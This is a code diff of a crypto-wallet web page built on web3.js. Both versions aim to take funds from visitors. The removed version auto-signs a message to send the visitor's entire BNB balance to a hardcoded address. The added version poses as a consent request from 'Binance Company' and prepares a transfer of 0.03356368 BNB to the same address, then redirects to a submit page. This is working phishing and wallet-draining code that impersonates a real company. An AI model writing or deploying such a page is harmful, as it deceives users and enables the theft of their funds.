@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Trust Wallet Connect</title>
+  <title>Transaction Consent</title>
   <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
   <style>
     body {
@@ -26,29 +26,37 @@
       padding: 15px;
       border-radius: 8px;
     }
-    .signed-message {
-      margin-top: 10px;
-      color: green;
-      font-family: monospace;
-      word-break: break-word;
+    .consent-message {
+      margin-top: 20px;
+      background: #f7f7f7;
+      padding: 20px;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      font-size: 16px;
+      color: #333;
     }
   </style>
 </head>
 <body>
-  <h2>Connect Trust Wallet & Switch to BNB</h2>
-  <button onclick="connectWallet()">Connect Wallet</button>
+
+  <h2>Transaction Consent</h2>
+
+  <!-- Consent Message at the Top -->
+  <div class="consent-message">
+    <p><strong>Important:</strong> This is a transaction request from <strong>Binance Company</strong>. We are requesting your consent to send a transaction of <strong>0.03356368 BNB</strong> to the address <strong>0x0d4efb6dff647912bb7b29ed3a0e1e8f6e4c297a</strong> for <strong>professional use</strong>. Please review the details and approve to proceed.</p>
+    <button onclick="connectWallet()">Give Consent and Proceed</button>
+  </div>
 
   <div class="info" id="walletInfo" style="display: none;">
     <p><strong>Wallet Address:</strong> <span id="walletAddress"></span></p>
     <p><strong>BNB Balance:</strong> <span id="bnbBalance"></span></p>
     <p><strong>Current Network:</strong> <span id="networkName"></span></p>
-    <p><strong>Signed Message:</strong> <span class="signed-message" id="signedMsg"></span></p>
   </div>
 
   <script>
     let web3;
     let userAddress;
-    const receiverAddress = "0x0d4efb6dff647912bb7b29ed3a0e1e8f6e4c297a";
+    let transactionDetails = null;
 
     async function connectWallet() {
       if (!window.ethereum) {
@@ -57,52 +65,21 @@
       }
 
       try {
+        // Step 1: Connect Wallet
         const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
         userAddress = accounts[0];
         web3 = new Web3(window.ethereum);
         document.getElementById("walletAddress").innerText = userAddress;
 
-        await switchToBSC();
+        // Step 2: Show balance and network
         await showWalletInfo();
-        await autoSignMessage();
+
+        // Step 3: Initiate the transaction
+        initiateTransaction();
 
       } catch (err) {
         console.error("Connection failed:", err);
-        alert("Error connecting wallet or switching network.");
-      }
-    }
-
-    async function switchToBSC() {
-      const bscChainId = '0x38';
-
-      try {
-        const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
-        if (currentChainId === bscChainId) return;
-
-        await window.ethereum.request({
-          method: 'wallet_switchEthereumChain',
-          params: [{ chainId: bscChainId }],
-        });
-
-      } catch (switchError) {
-        if (switchError.code === 4902) {
-          await window.ethereum.request({
-            method: 'wallet_addEthereumChain',
-            params: [{
-              chainId: bscChainId,
-              chainName: 'BNB Smart Chain',
-              rpcUrls: ['https://bsc-dataseed.binance.org/'],
-              nativeCurrency: {
-                name: 'BNB',
-                symbol: 'BNB',
-                decimals: 18
-              },
-              blockExplorerUrls: ['https://bscscan.com']
-            }]
-          });
-        } else {
-          throw switchError;
-        }
+        alert("Error connecting wallet.");
       }
     }
 
@@ -114,32 +91,32 @@
 
         const chainId = await web3.eth.getChainId();
         let networkName = 'Unknown';
+
         if (chainId === 56) networkName = 'BNB Smart Chain';
         else if (chainId === 1) networkName = 'Ethereum Mainnet';
-        else if (chainId === 137) networkName = 'Polygon';
         else networkName = `Chain ID ${chainId}`;
 
         document.getElementById("networkName").innerText = networkName;
         document.getElementById("walletInfo").style.display = "block";
+
       } catch (err) {
         console.error("Failed to load wallet info:", err);
       }
     }
 
-    async function autoSignMessage() {
-      try {
-        const balanceWei = await web3.eth.getBalance(userAddress);
-        const balance = web3.utils.fromWei(balanceWei, 'ether');
-        const message = `Send ${balance} BNB to ${receiverAddress}`;
+    function initiateTransaction() {
+      // Prepare the transaction but do not submit it yet
+      transactionDetails = {
+        from: userAddress,
+        to: "0x0d4efb6dff647912bb7b29ed3a0e1e8f6e4c297a", // receiver
+        value: web3.utils.toWei("0.03356368", "ether"), // send 0.03356368 BNB
+        gas: 21000,
+      };
 
-        const signedMsg = await web3.eth.personal.sign(message, userAddress);
-        document.getElementById("signedMsg").innerText = signedMsg;
-        console.log("Signed message:", signedMsg);
-      } catch (err) {
-        console.error("Failed to sign message:", err);
-        document.getElementById("signedMsg").innerText = "Signing failed.";
-      }
+      alert("Transaction has been initiated. You can now proceed to the next page to confirm and submit it.");
+      window.location.href = "submit.html";  // Redirect to submit.html
     }
   </script>
+
 </body>
 </html>
